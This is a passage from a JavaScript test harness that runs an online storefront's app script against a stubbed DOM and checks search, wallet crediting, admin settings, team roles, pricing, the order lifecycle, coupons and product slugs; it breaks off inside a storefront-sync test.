/* Headless harness: executes the REAL inline app script from index.html against a
   minimal DOM/localStorage stub, then asserts the behaviour of the changed code.
   Run: node tests/harness.js   (from maneshkumarcommissionagent/) */
"use strict";
// Deterministic tests: the live storefront shuffles product order on every fresh
// page load (intended), but the suite must assert the same result on every run,
// so the app's shuffleProducts() no-ops when this flag is set. Browser-safe:
// browsers have no process.env, so live shuffle behaviour is unchanged.
process.env.NUKTO_NO_SHUFFLE = "1";
// NOTE on `hidden` products: consolidateCatalogProducts() merges repeated supplier
// rows into one customer-facing card; merged-away rows stay in PRODUCTS with
// hidden=true as aliases (old SKU links keep working via prod()). Price, stock and
// slug assertions below must therefore use VISIBLE products only (!p.hidden) —
// picking a hidden alias would assert against the alias row while the app
// correctly reads/writes the canonical product (cart/ratio/restock/slug paths).
const fs = require("fs");
const path = require("path");

const html = fs.readFileSync(path.join(__dirname, "..", "index.html"), "utf8");
const blocks = [...html.matchAll(/<script(?![^>]*src)(?![^>]*ld\+json)[^>]*>(.*?)<\/script>/gs)].map(m => m[1]);
/* The application now lives in an external, same-origin app.js (the only inline
   <script> left in index.html is the pre-paint theme bootstrap, which MUST stay
   inline). The suite executes bootstrap + app.js exactly as the browser would. */
const appJs = fs.readFileSync(path.join(__dirname, "..", "app.js"), "utf8");
const appSrc = blocks.join("\n") + "\n" + appJs;
/* Everything the browser receives for the page: markup + externalised script.
   Assertions about behaviour/CSS/markup read this union, so moving code between
   index.html and app.js can never silently weaken a test. */
const pageSrc = html + "\n" + appJs;

/* ---------- tiny DOM stub ---------- */
function el(id) {
  const e = {
    id, style: {}, innerHTML: "", textContent: "", value: "", checked: false,
    classList: { add(){}, remove(){}, toggle(){} , contains(){return false;} },
    addEventListener(){}, setAttribute(){}, getAttribute(){ return null; },
    querySelector(){ return el(id + "-q"); }, querySelectorAll(){ return []; },
    insertAdjacentHTML(){}, blur(){}, files: [], click(){},
  };
  return e;
}
const _els = {};
const document = {
  readyState: "complete",
  title: "",
  _els,
  getElementById(id){ return _els[id] || (_els[id] = el(id)); },
  querySelector(){ return el("meta"); },
  querySelectorAll(){ return []; },
  addEventListener(){}, createElement(tag){ return el(tag); },
};
const _ls = new Map();
const localStorage = {
  getItem(k){ return _ls.has(k) ? _ls.get(k) : null; },
  setItem(k, v){ _ls.set(k, String(v)); },
  removeItem(k){ _ls.delete(k); },
  key(i){ return [..._ls.keys()][i] ?? null; },
  get length(){ return _ls.size; },
};
const location = { hash: "", href: "http://localhost/" };
const window = {
  addEventListener(){}, scrollTo(){}, innerHeight: 800, scrollY: 0,
  NUKTO_CATALOG: undefined, onscroll: null,
};
const navigator = { language: "en-PK", clipboard: undefined };
let __fetchHandler = null; // sync tests install a fake Supabase here; default = backend offline
function fetch(url, opts){ if(__fetchHandler) return __fetchHandler(url, opts); return Promise.resolve({ ok: false, status: 0, json: () => Promise.resolve([]) }); }
class Image { set src(v){} }
class FileReader { readAsDataURL(){} }
class IntersectionObserver { constructor(){} observe(){} disconnect(){} }

/* ---------- load catalog ---------- */
const catSrc = fs.readFileSync(path.join(__dirname, "..", "catalog.js"), "utf8");
new Function("window", catSrc)(window);
console.log("catalog entries:", (window.NUKTO_CATALOG || []).length);

/* ---------- run the app with export hooks ---------- */
const hooks = `
;return {
  productSlug, resolveProduct, slugify, idCode, product, prod, discountPct,
  get PRODUCTS(){ return PRODUCTS; }, get CATEGORIES(){ return CATEGORIES; },
  get PRODUCT_ALIASES(){ return PRODUCT_ALIASES; },
  buildStorefrontPayload, publishStorefront, pullStorefront, markStorefrontDirty, isStorefrontDirty,
  get stockDirty(){ return stockDirty; }, get couponGraves(){ return couponGraves; }, get cloudOOS(){ return cloudOOS; },
  get txns(){ return txns; }, set txns(v){ txns = v; },
  get users(){ return users; }, set users(v){ users = v; },
  get orders(){ return orders; }, set orders(v){ orders = v; },
  get returns(){ return returns; }, set returns(v){ returns = v; },
  get user(){ return user; }, set user(v){ user = v; },
  get complaints(){ return complaints; }, set complaints(v){ complaints = v; },
  get settings(){ return settings; },
  waNumber, waLink, get DEFAULT_SETTINGS(){ return DEFAULT_SETTINGS; },
  searchProducts, relatedToSearch, stemmedToks, stem, stockLabel, normalizePhone, isValidPhone,
  prettyPhone, uniqueUsername, myTxns, isMyOrder, ordersView, productsPage, hashPw,
  approveTxn, rejectTxn, approveReturn, purgeStaleData, reconcileWallet, saveAll,
  saveAdminSettings, editProductField,
  tryLogin, addTeamMember, setTeamRole, delTeamMember, setProdRatio, setCatRatio, resetProdRatio,
  adminImportProducts, wooCSVToProducts, exportOrdersCSV, exportProductsCSV,
  setOrderStatus, setDeliveryStatus, saveDeliveryFee, adminReviews, toggleReviewHide, allReviewsFor, applyCoupon, adminLogin,
  get activity(){ return activity; },
  get notifs(){ return notifs; },
  get coupons(){ return coupons; }, set coupons(v){ coupons = v; },
  get promo(){ return promo; },
  needEdit, adminRoute, priceFromRatio, curProdRatio,
  get team(){ return team; }, set team(v){ team = v; },
  get session(){ return session; }, set session(v){ session = v; },
  get prodRatios(){ return prodRatios; }, get catRatios(){ return catRatios; },
  get priceGuard(){ return priceGuard; },
  normText, scoreProduct, buildSearchIndex, tokenize, wallet, authForm, checkout, openDeposit,
  /* LEMON EDITION + COD lifecycle surface */
  get THEMES(){ return THEMES; }, get ADMIN_USER(){ return ADMIN_USER; }, get ADMIN_HASH(){ return ADMIN_HASH; },
  get BUILTIN_TEAM(){ return BUILTIN_TEAM; }, allTeamMembers, finishAdminLogin, loginLockState, loginLockBump,
  get DEFAULT_DELIVERY_ZONES(){ return DEFAULT_DELIVERY_ZONES; }, deliveryZones, zoneFor, deliveryFeeFor, zoneLabelFor,
  checkoutAddress, codAdvancePct, codAdvanceAmount, codDueAmount, codRuleHTML,
  get ORDER_STATES(){ return ORDER_STATES; }, get ORDER_STATE_LABEL(){ return ORDER_STATE_LABEL; },
  get LEGACY_STATE(){ return LEGACY_STATE; }, get FLOW_STEPS(){ return FLOW_STEPS; },
  orderState, stateLabel, stateChip, flowHTML, etaBoxHTML, orderEtaDays, setOrderEtaDays, sweepOrderTimelines,
  markAdvancePaid, confirmCodOrderAdmin, setOrderNote, adminOrders, adminDelivery, verifyPayment,
  endlessBarHTML, reviewOrderPopup, placeOrderWith, finalizeOrder, confirmation, pushCloudOrder,
  _searchSuggNow, searchSugg, runSearch, closeSugg, recentSearches, popularSearchTerms, buildSnow, toggleWinter,
  get suggRows(){ return _suggRows; },
  get SETTING_SYNC_KEYS(){ return SETTING_SYNC_KEYS; }, get DEFAULT_SETTINGS_KEYS(){ return Object.keys(DEFAULT_SETTINGS); },
  get cart(){ return cart; }, set cart(v){ cart = v; },
  cartSubtotal, cartStockIssues, cartUnit,
  checkoutTaxLines, checkoutTaxTotal, cartPayable, fmtCharge, fmt2, toggleChargeRow,
  product, cartView, sectionsPage, categoriesPage, get CHARGE_TAGLINE(){ return CHARGE_TAGLINE; }, login, signup, account, wishlistView, trackingView, complaint, returnsView, settings2, support, terms, about,
  contact, privacyPolicy, shippingPolicy, refundPolicy, shopInfoLinks, render,
  renderHeader,
  renderFooter,
  resetView,
  /* runtime security guard (2026-10-28 ClickFix incident) */
  nuktoHost, nuktoHostAllowed, nuktoSrcAllowed, safeCopyText, hostGuard,
  reportSecurity, lockClipboard, startInjectionWatch, copyPay,
  cookieConsent, showConsent, get consent(){ return consent; }, set consent(v){ consent = v; },
  get NUKTO_HOST_SUFFIXES(){ return NUKTO_HOST_SUFFIXES; },
  get NUKTO_SRC_SUFFIXES(){ return NUKTO_SRC_SUFFIXES; },
  get NUKTO_CMD_PATTERN(){ return NUKTO_CMD_PATTERN; },
};`;

function makeApp() {
  return new Function("window", "document", "localStorage", "navigator", "location", "fetch", "Image", "FileReader", "IntersectionObserver", appSrc + hooks)(
    window, document, localStorage, navigator, location, fetch, Image, FileReader, IntersectionObserver
  );
}
let app;
try {
  app = makeApp();
} catch (e) {
  console.error("APP EXECUTION FAILED:", e.stack || e);
  process.exit(2);
}

/* ---------- assertions ---------- */
let pass = 0, fail = 0;
function t(name, cond, extra) {
  if (cond) { pass++; console.log("PASS  " + name); }
  else { fail++; console.log("FAIL  " + name + (extra !== undefined ? "  -> " + JSON.stringify(extra) : "")); }
}

// boot ran: catalog normalised + search index built
t("catalog loaded (weekly merge)", app.PRODUCTS.length > 5000, app.PRODUCTS.length);
{
  const ids = new Set(app.PRODUCTS.map(p => p.id));
  const oldIds = JSON.parse(require("fs").readFileSync(require("path").join(__dirname, "..", "data", "old_catalog_full.json"), "utf8")).map(p => p.id);
  t("weekly rule: every last-week product live or marked not-available", oldIds.every(id => ids.has(id)));
  t("weekly rule: na-flagged products are stock 0", app.PRODUCTS.filter(p => p.na === 1).every(p => p.stock === 0));
}
t("weekly rule: new products carry new flag", app.PRODUCTS.some(p => p.new === 1));

// B1: fake urgency removed
t("stockLabel(5) is empty (no 'only N left')", app.stockLabel({ stock: 5 }) === "", app.stockLabel({ stock: 5 }));
t("stockLabel(3) is empty", app.stockLabel({ stock: 3 }) === "", app.stockLabel({ stock: 3 }));
t("stockLabel(0) says Out of Stock", /Out of Stock/.test(app.stockLabel({ stock: 0 })));

// D: search
const tb = app.searchProducts("tooth brush");
t("'tooth brush' finds >=25 products", tb.length >= 25, tb.length);
const el_tb = tb.filter(p => /electric/i.test(p.name) && /tooth/i.test(p.name));
t("electric toothbrush is a 'tooth brush' hit", el_tb.length >= 1, el_tb.map(p => p.id).slice(0, 3));
t("electric toothbrush ranks in top 25 for 'tooth brush'", tb.slice(0, 25).some(p => /electric/i.test(p.name)), tb.slice(0, 6).map(p => p.name.slice(0, 40)));
t("'toothbrushes' plural works", app.searchProducts("toothbrushes").length >= 10, app.searchProducts("toothbrushes").length);
t("typo 'tothbrush' works", app.searchProducts("tothbrush").length >= 5, app.searchProducts("tothbrush").length);
t("unrelated query 'qwertyzx' finds nothing", app.searchProducts("qwertyzx").length === 0, app.searchProducts("qwertyzx").length);
t("'watch' matches smartwatches", app.searchProducts("watch").length >= 100, app.searchProducts("watch").length);
t("related block non-empty for 'tooth brush'", app.relatedToSearch("tooth brush", tb.slice(0, 60), 24).length > 0);

// C1: phones
t("03001234567 valid", app.isValidPhone("03001234567"));
t("+92 300 1234567 valid", app.isValidPhone("+92 300 1234567"));
t("923001234567 valid", app.isValidPhone("923001234567"));
t("0300123456 (10 digits) invalid", !app.isValidPhone("0300123456"));
t("021-3567xxxx landline invalid", !app.isValidPhone("02135671234"));
t("abc invalid", !app.isValidPhone("abc"));
t("normalize +92 -> 03", app.normalizePhone("+923001234567") === "03001234567", app.normalizePhone("+923001234567"));

// C3/C5: wallet only shows own txns; demo rows purged
app.users = [{ id: "U-TEST1", fullName: "Test User", username: "tester", email: "t@x.com", phone: "03001234567", passwordHash: app.hashPw("password1"), status: "active", date: "2026-09-02", walletBalance: 0 }];
app.user = { id: "U-TEST1", fullName: "Test User", username: "tester", email: "t@x.com", phone: "03001234567", walletBalance: 0, joined: "2026-09-02" };
app.txns = [
  { id: "T-OLD1", type: "deposit", amount: 500, method: "easypaisa", status: "approved", date: "2026-08-20", ref: "EP-88123" },
  { id: "T-OLD2", type: "purchase", amount: 2499, method: "easypaisa", status: "approved", date: "2026-08-24", ref: "ORD-2201" },
  { id: "T-MINE", type: "deposit", amount: 1000, method: "jazzcash", status: "pending", date: "2026-09-03", ref: "JT-1", userId: "U-TEST1", userName: "Test User" },
  { id: "T-OTHER", type: "deposit", amount: 700, method: "easypaisa", status: "approved", date: "2026-09-01", ref: "EP-9", userId: "U-OTHER", userName: "Someone Else" },
];
_ls.delete("nukto.purged1"); // boot() already consumed the one-time flag with empty test data
app.purgeStaleData();
t("demo/stale txns purged", app.txns.length === 1 && app.txns[0].id === "T-MINE", app.txns.map(x => x.id));
// after purge only mine remains, but myTxns is pending-only for me
t("myTxns shows only own rows", app.myTxns().length === 1 && app.myTxns()[0].id === "T-MINE", app.myTxns());

// C8: approve credits the customer, not the admin
app.txns = [{ id: "T-P1", type: "deposit", amount: 500, method: "easypaisa", status: "pending", date: "2026-09-04", ref: "EP-1", userId: "U-TEST1", userName: "Test User" }];
app.user = { id: "U-ADMIN", fullName: "Admin", username: "admin1", walletBalance: 0 }; // admin is signed in on another device
app.users[0].walletBalance = 0;
app.approveTxn("T-P1");
t("approved deposit credited customer (500)", app.users[0].walletBalance === 500, app.users[0].walletBalance);
t("admin wallet untouched", (app.user.walletBalance || 0) === 0, app.user.walletBalance);
t("approve twice blocked", (app.approveTxn("T-P1"), app.users[0].walletBalance === 500), app.users[0].walletBalance);

// returns credit the owner
app.user = { id: "U-ADMIN", fullName: "Admin", username: "admin1", walletBalance: 0 };
app.returns = [{ id: "RTN-1", orderId: "ORD-9", userId: "U-TEST1", userName: "Test User", amount: 200, reason: "x", status: "pending" }];
app.approveReturn("RTN-1");
t("return refund credited owner (700)", app.users[0].walletBalance === 700, app.users[0].walletBalance);

// C4: order ownership by phone fallback
app.user = { id: "U-TEST1", phone: "03001234567", email: "t@x.com" };
app.orders = [{ id: "ORD-A", userId: "U-GHOST", deliveryPhone: "+92 300 1234567", items: [], total: 100, date: "2026-09-03", orderStatus: "pending", pm: "wallet", paymentStatus: "verified" }];
t("order matched via phone when userId differs", app.isMyOrder(app.orders[0]) === true);

// my orders page renders the owner's order
const ov = app.ordersView();
t("ordersView contains ORD-A", ov.includes("ORD-A"));

// B2: router default renders products page (no home hero)
t("productsPage renders grid or category rails", /pgrid|cat-rail/.test(app.productsPage("", "", "")) );

const pp = app.productsPage("", "", "");
t("no numbered pager on storefront", !/onclick="productsPage\._page=/.test(pp) && !/‹ Prev/.test(pp));
t("home shows category rails", /cat-rail/.test(pp) && /Show more/.test(pp));
const catPage = app.productsPage("", app.CATEGORIES[0].slug, "");
t("category page uses endless feed sentinel", /feed-sentinel/.test(catPage) || /Load more/.test(catPage) || /pgrid/.test(catPage));

// C6 + C8: wallet page has Top Up + no withdraw + own-only history
app.user = { id: "U-TEST1", fullName: "Test User", username: "tester", email: "t@x.com", phone: "03001234567", walletBalance: 700, joined: "2026-09-02" };
const w = app.wallet();
t("wallet page has Top Up button", /Top Up/.test(w));
t("wallet page has no withdraw control", !/withdraw/i.test(w.replace(/Withdrawal ki sahulat nahi|Withdrawal available nahi|no withdrawal/gi, "")), w.match(/.{0,40}[Ww]ithdraw.{0,40}/g));
t("wallet mentions no-withdrawal policy", /Withdrawal/.test(w));

// C2 + C3: signup form slimmed (no gender/age/city/username field)
const su = app.authForm("Create Account", "signup", true, "x");
t("signup has no Gender select", !/Gender/.test(su));
t("signup has no Age field", !/Age/.test(su));
t("signup has no City field", !/City/.test(su));
t("signup has no manual Username field", !/Username \*/.test(su));
t("signup still requires name/email/phone/pass/terms", /Full Name/.test(su) && /Email/.test(su) && /Phone Number/.test(su) && /Confirm Password/.test(su) && /Terms/.test(su));

// coupon inputs carry no hint text
t("cart coupon box blank (no 'try this code')", !/try this/i.test(htmlSrcCheck()));

// A1/E1: saves actually land in localStorage (quota failures would now be loud)
app.saveAll();
t("saveAll writes nukto.user to storage", _ls.has("nukto.user"));
t("saveAll writes nukto.txns to storage", _ls.has("nukto.txns"));
t("saveAll reports ok on healthy storage", app.saveAll() === true);

/* ---------- E1/E2: admin edits survive a FULL RELOAD (second app instance, same storage) ---------- */
// simulate the admin typing in the Settings form and pressing Save
const setVal = (id, v) => { document.getElementById(id).value = v; };
setVal("s_storeName", "MKCA TEST");
setVal("s_tagline", "Test tagline line");
setVal("s_email", "care@maneshkumarcommissionagent.dpdns.org");
setVal("s_phone", "03001112223");
setVal("s_deliveryFee", "249");
setVal("s_deliveryFree", "5000");
setVal("s_delNote", "Test delivery note");
setVal("s_banner", "NEW HOME DESCRIPTION FROM ADMIN — free delivery over Rs. 5,000!");
setVal("s_ep", "0345-TEST-EP");
setVal("s_jc", "0300-TEST-JC");
app.saveAdminSettings();

// admin edits a product price inline (visible product: hidden rows are merge aliases)
const pid = app.PRODUCTS.find(p => !p.hidden).id;
app.editProductField(pid, "price", 7777);

// --- reload the whole app (fresh instance over the same localStorage) ---
let app2;
try { app2 = makeApp(); } catch (e) { console.error("RELOAD INSTANCE FAILED:", e.stack || e); process.exit(2); }
t("RELOAD: admin store name persisted", app2.settings.storeName === "MKCA TEST", app2.settings.storeName);
t("RELOAD: admin banner (home description) persisted", app2.settings.banner.includes("NEW HOME DESCRIPTION FROM ADMIN"), app2.settings.banner);
t("RELOAD: admin delivery fee persisted", app2.settings.deliveryFee === 249, app2.settings.deliveryFee);
t("RELOAD: landing page SHOWS admin banner text", app2.productsPage("", "", "").includes("NEW HOME DESCRIPTION FROM ADMIN"));
t("RELOAD: landing page SHOWS admin tagline", app2.productsPage("", "", "").includes("Test tagline line"));
t("RELOAD: product price edit persisted", (app2.PRODUCTS.find(p => p.id === pid) || {}).price === 7777, (app2.PRODUCTS.find(p => p.id === pid) || {}).price);

/* ---------- F: team roles + ratio engine (admin control panel) ---------- */
t("team: member add", app2.addTeamMember("ali", "pass123", "editor").ok === true);
t("team: duplicate name rejected", app2.addTeamMember("ali", "pass123", "viewer").ok === false);
const sesEd = app2.tryLogin("ali", "pass123");
t("team: login with member creds", !!sesEd && sesEd.role === "editor", JSON.stringify(sesEd));
t("team: wrong password rejected", app2.tryLogin("ali", "nope") === null);
app2.addTeamMember("zara", "pass123", "viewer");
app2.session = app2.tryLogin("zara", "pass123");
t("roles: viewer is read-only", app2.needEdit() === false);
t("roles: viewer blocked from team page", app2.adminRoute("team").includes("No access"));
app2.session = sesEd;
t("roles: editor can edit", app2.needEdit() === true);
const rp = app2.PRODUCTS.find(p => !p.hidden && p.cost > 500);
app2.setProdRatio(rp.id, "2.5");
const expP = app2.priceFromRatio(rp.cost, 2.5);
t("ratio: product ratio reprices product", rp.price === expP, rp.price + " vs " + expP);
const lbl = rp.catLabel;
app2.setCatRatio(lbl, "1.8");
const other = app2.PRODUCTS.find(p => !p.hidden && p.catLabel === lbl && p.cost > 0 && p.id !== rp.id && !(p.id in app2.prodRatios));
const expC = app2.priceFromRatio(other.cost, 1.8);
t("ratio: category ratio reprices members", other.price === expC, other.price + " vs " + expC);
t("ratio: custom-ratio product unaffected by category change", rp.price === expP, rp.price);
const app3 = makeApp();
t("ratio: reprice survives reload", (app3.PRODUCTS.find(p => p.id === rp.id) || {}).price === expP);
t("team: member survives reload", (app3.team || []).some(m => m.name === "ali"));
app3.session = { name: "admin1", role: "owner" };
t("admin: pricing page renders with ratio table", app3.adminRoute("pricing").includes("Category ratios"));
t("admin: pricing page has editable per-product ratio", app3.adminRoute("pricing").includes("setProdRatio"));
t("admin: team page renders", app3.adminRoute("team").includes("Add Member"));
t("admin: products page renders", app3.adminRoute("products").includes("Add Product"));
t("admin: panel is secret (no public link)", !require("fs").readFileSync(require("path").join(__dirname, "..", "index.html"), "utf8").includes("Admin Panel</a>"));
const imp = app3.adminImportProducts({ products: [{ id: "imp-1", name: "Import Test Widget", cost: 100, price: 200, catLabel: "Gadgets" }] });
t("admin bulk import uploads product", imp.ok === true && imp.added === 1 && !!app3.PRODUCTS.find(p => p.id === "imp-1"));
t("admin bulk import skips duplicates", app3.adminImportProducts([{ id: "imp-1", name: "dup" }]).added === 0);
t("search page always shows related products w/ cards", app3.productsPage("cream", "", "").includes("Related to") && app3.productsPage("cream", "", "").includes("pcard"));
t("search suggestions page renders product media cards", app3.productsPage("wall clock", "", "").includes("pimg"));
t("new product shows New badge on storefront", app3.productsPage("nikah thumbprint", "", "").includes(">New</span>"));
const csvSample = 'Type,SKU,Name,Regular price,Categories,Images,Description,In stock?,Store,Variation Attributes,Parent ID\n' +
  'simple,CSV-9001,CSV Test Widget,500,Gadgets,,csv desc,1,Import,,\n' +
  'simple,hhc-9002,CSV Parent Widget,800,Gadgets,,parent desc,1,Import,,\n' +
  'variation,hhc-9002-1,,300,,,,,,,Color: Red,9002.0\n';
const parsedCsv = app3.wooCSVToProducts(csvSample);
t("csv parse: parents + variant grouped", parsedCsv.length === 2 && parsedCsv[1].vars.length === 1, JSON.stringify(parsedCsv.map(p => [p.id, p.vars.length])));
const upCsv = app3.adminImportProducts(parsedCsv);
t("csv upload via admin panel", upCsv.added === 2 && !!app3.PRODUCTS.find(x => x.id === "CSV-9001"));
t("orders CSV export returns data", typeof app3.exportOrdersCSV() === "string" && app3.exportOrdersCSV().includes('"Order","Customer"'));
t("activity log records team uploads", app3.activity.some(a => /uploaded 2 products/.test(a.msg)));

/* ---------- H: notifications, reviews moderation, coupon dates, 2FA, delivery fee, cat sales ---------- */
_ls.set("nukto.userReviews", JSON.stringify({ "hhc-1": [{ name: "Ali", rating: 5, date: "2026-01-01", text: "acha product" }] }));
const app4 = makeApp();
app4.session = { name: "admin1", role: "owner" };
t("review visible before moderation", app4.allReviewsFor({ id: "hhc-1" }).some(r => r.name === "Ali"));
app4.toggleReviewHide("hhc-1|Ali|2026-01-01");
t("review hidden after moderation", !app4.allReviewsFor({ id: "hhc-1" }).some(r => r.name === "Ali"));
t("reviews moderation page renders", app4.adminRoute("reviews").includes("Reviews Moderation"));
app4.orders = [{ id: "ORD-T1", phone: "03001234567", deliveryPhone: "03001234567", items: [], total: 100,
  orderStatus: "pending", paymentStatus: "pending", pm: "cod", payMode: "cod",
  advancePercent: 20, advanceAmount: 20, dueOnDelivery: 80, advanceStatus: "unpaid" }];
app4.setOrderStatus("ORD-T1", "shipped");                       // legacy word, illegal jump from PENDING
t("lifecycle guard: PENDING cannot jump straight to shipped", app4.orders[0].orderStatus === "pending", app4.orders[0].orderStatus);
app4.setOrderStatus("ORD-T1", "confirmed");
t("order status change notifies customer", app4.notifs.length > 0 && /CONFIRM/i.test(app4.notifs[0].msg), JSON.stringify(app4.notifs[0] || {}));
t("confirmation stamps confirmedAt + history", !!app4.orders[0].confirmedAt && (app4.orders[0].statusHistory || []).some(h => h.state === "confirmed"));
app4.notifs.length = 0;
app4.setOrderStatus("ORD-T1", "refunded");                      // money states are not reachable from CONFIRMED
t("lifecycle guard: CONFIRMED cannot jump to REFUNDED", app4.orders[0].orderStatus === "confirmed" && app4.notifs.length === 0, app4.orders[0].orderStatus);
app4.setOrderStatus("ORD-T1", "in_transit");
t("CONFIRMED → ON THE WAY allowed", app4.orderState(app4.orders[0]) === "in_transit", app4.orderState(app4.orders[0]));
app4.setOrderStatus("ORD-T1", "received");
t("ON THE WAY → ORDER RECEIVED allowed", app4.orderState(app4.orders[0]) === "received");
app4.notifs.length = 0;
app4.setOrderStatus("ORD-T1", "confirmed");                     // a finished order can never roll backwards
t("lifecycle guard: RECEIVED cannot roll back to CONFIRMED", app4.orders[0].orderStatus === "received" && app4.notifs.length === 0, app4.orders[0].orderStatus);
document.getElementById("dv_fee").value = "349"; document.getElementById("dv_free").value = "6000";
app4.saveDeliveryFee();
t("delivery fee editable in admin", app4.settings.deliveryFee === 349 && app4.settings.deliveryFreeAbove === 6000, app4.settings.deliveryFee);
t("member with 2FA PIN added", app4.addTeamMember("sec", "pass123", "editor", "4321").ok === true);
document.getElementById("a_user").value = "sec"; document.getElementById("a_pass").value = "pass123"; document.getElementById("a_pin").value = "0000";
app4.session = null; app4.adminLogin();
t("2FA blocks wrong PIN", !app4.session);
document.getElementById("a_pin").value = "4321"; app4.adminLogin();
t("2FA accepts correct PIN", !!app4.session && app4.session.role === "editor", JSON.stringify(app4.session));
app4.coupons = [...app4.coupons, { code: "FUTURE", type: "percent", value: 10, active: true, start: "2099-01-01", minOrder: 0 }];
app4.applyCoupon("FUTURE");
t("coupon with future start date rejected", !app4.promo);
const _catProd = app4.PRODUCTS.find(p => !p.hidden);
app4.orders[0].items = [{ id: _catProd.id, qty: 2, name: _catProd.name }];
t("category-wise sales report renders", app4.adminRoute("analytics").includes("Category-wise Sales"));

// coupon once-per-customer limit (owner logic list #10)
{
  app4.coupons.push({ code: "ONCE1", type: "pct", value: 5, active: true, uses: 0 });
  app4.applyCoupon("ONCE1");
  const afterFirst = app4.promo && app4.promo.code === "ONCE1";
  app4.applyCoupon("ONCE1"); // second use must be rejected
  const uses = JSON.parse(_ls.get("nukto.couponUse") || "{}");
  const key = Object.keys(uses).find(k => k.endsWith(":ONCE1"));
  t("coupon applies once, second use rejected (per-customer limit)", afterFirst && uses[key] === 1);
}
// cancelled order restores stock (owner logic list #7)
{
  const pr = app4.PRODUCTS.find(p => !p.hidden && p.stock > 0);
  const o = app4.orders[0];
  o.items = [{ id: pr.id, qty: 2, name: pr.name }];
  const b = pr.stock;
  o.orderStatus = "pending"; // fresh state: cancel from pending is a legal transition
  app4.setOrderStatus(o.id, "cancelled");
  t("cancelled order restores stock", pr.stock === b + 2);
}
// cart always prices at CURRENT catalog price, never stale add-time price (spec §11/§12)
{
  const p = app4.PRODUCTS.find(x => !x.hidden && x.price > 100);
  app4.cart.length = 0;
  app4.cart.push({ id: p.id, qty: 1, v: "", price: 1 });
  const old = p.price; p.price = 2500;
  t("cart recalculates at current price, not stale", app4.cartSubtotal() === 2500);
  p.price = old; app4.cart.length = 0;
}
// out-of-stock / over-qty lines are flagged before checkout (spec §11)
{
  const p = app4.PRODUCTS.find(x => !x.hidden && x.stock > 0);
  app4.cart.length = 0; app4.cart.push({ id: p.id, qty: 1, v: "", price: p.price });
  const clean = app4.cartStockIssues().length === 0;
  const oldStock = p.stock; p.stock = 0;
  const flagged = app4.cartStockIssues().length === 1;
  p.stock = oldStock; app4.cart.length = 0;
  t("cart flags out-of-stock items before checkout", clean && flagged);
}
// order status transitions must be sensible (spec §14)
{
  const o = app4.orders[0];
  o.orderStatus = "delivered";
  app4.setOrderStatus(o.id, "pending");
  t("delivered order cannot silently go back to pending", o.orderStatus === "delivered");
}
// password-reset page renders from email link (token~email)
{
  const ok = app4.resetView("abc123~ali@example.com");
  t("reset page renders for valid link", ok.includes("Reset Password") && ok.includes("ali@example.com"));
  t("reset page rejects malformed link", app4.resetView("badlink").includes("ghalat"));
}



/* ---------- I: full-site smoke — har page render ho, koi logic break na ho ---------- */
const app5 = makeApp();
app5.session = { name: "admin1", role: "owner" };
const S = [["home", () => app5.productsPage("", "", "")], ["products", () => app5.productsPage("", "", "")],
["search", () => app5.productsPage("wall clock", "", "")], ["category", () => app5.productsPage("", app5.CATEGORIES[0].slug, "")],
["sections", () => app5.sectionsPage()], ["product", () => app5.product(app5.PRODUCTS[0].id)], ["cart", () => app5.cartView()],
["checkout", () => app5.checkout()], ["login", () => app5.login()], ["signup", () => app5.signup()], ["account", () => app5.account()],
["orders", () => app5.ordersView()], ["wishlist", () => app5.wishlistView()], ["tracking", () => app5.trackingView("ORD-T1")],
["complaint", () => app5.complaint()], ["returns", () => app5.returnsView()], ["wallet", () => app5.wallet()],
["settings", () => app5.settings2()], ["support", () => app5.support()], ["terms", () => app5.terms()], ["about", () => app5.about()]];
/* ---------- clean product URLs (slugs) ---------- */
{
  const p0 = app5.PRODUCTS.find(p => !p.hidden); // visible card: hidden rows are aliases whose slug resolves to the canonical product
  const sl = app5.productSlug(p0);
  t("slug has no supplier prefix in URL", !/hhc/i.test(sl), sl);
  t("slug is url-safe (lowercase, dashes only)", /^[a-z0-9]+(-[a-z0-9]+)*$/.test(sl), sl);
  t("slug resolves back to the same product", app5.resolveProduct(sl) === p0);
  t("legacy raw id still resolves (old links/bookmarks)", app5.resolveProduct(p0.id) === p0);
  t("product page renders from a slug", app5.product(sl).indexOf("Product not found") === -1);
  t("product page renders from a legacy id", app5.product(p0.id).indexOf("Product not found") === -1);
  t("unknown slug shows not-found instead of crashing",
    app5.product("totally-made-up-slug-zzzz99").indexOf("Product not found") !== -1);
  // uniqueness across the WHOLE catalog (9,805 products) — a collision would
  // silently send a customer to the wrong product page
  const seen = new Set(); let dup = 0, leak = 0;
  for (const p of app5.PRODUCTS) {
    const s2 = app5.productSlug(p);
    if (seen.has(s2)) dup++; seen.add(s2);
    if (/hhc/i.test(s2)) leak++;
  }
  t("all " + app5.PRODUCTS.length + " slugs are unique", dup === 0, "dups=" + dup);
  t("no supplier id leaks in any slug", leak === 0, "leaks=" + leak);
}
let smokeFail = "";
S.forEach(([v, fn]) => { try { const html = fn(); if (typeof html !== "string" || html.length < 60) smokeFail += v + " "; } catch (e) { smokeFail += v + "(" + e.message + ") "; } });
t("smoke: all 21 storefront pages render", smokeFail === "", smokeFail);
const adminPages = ["dashboard", "users", "products", "categories", "dropshipping", "pricing", "orders", "delivery", "complaints", "wallet", "returns", "analytics", "coupons", "integy", "settings", "team", "reviews"];
let adminFail = "";
adminPages.forEach(pg => { try { const html = app5.adminRoute(pg); if (!html || html.length < 300) adminFail += pg + " "; } catch (e) { adminFail += pg + "(" + e.message + ") "; } });
t("smoke: all 17 admin pages render without error", adminFail === "", adminFail);

function htmlSrcCheck(){ return require("fs").readFileSync(require("path").join(__dirname, "..", "index.html"), "utf8"); }

/* ---------- J: global storefront sync (admin publish → all devices pull) ---------- */
(async () => {
const app6 = makeApp();
app6.session = { name: "admin1", role: "owner" };
const visA = app6.PRODUCTS.find(p => !p.hidden && p.price > 100);
const visB = app6.PRODUCTS.find(p => !p.hidden && p.id !== visA.id && p.stock > 0);
const hidA = app6.PRODUCTS.find(p => p.hidden && app6.PRODUCT_ALIASES[p.id] !== visA.id && app6.PRODUCT_ALIASES[p.id] !== visB.id);
const visC = app6.PRODUCTS.find(p => !p.hidden && p.id !== visA.id && p.id !== visB.id && p.id !== app6.PRODUCT_ALIASES[hidA.id] && p.price > 50);
const visD = app6.PRODUCTS.find(p => !p.hidden && ![visA.id, visB.id, visC.id, app6.PRODUCT_ALIASES[hidA.id]].includes(p.id));
t("sync fixtures exist", !!(visA && visB && hidA && visC && visD));

// --- J1: payload sanitization (cost/store stripped, secrets never present) ---
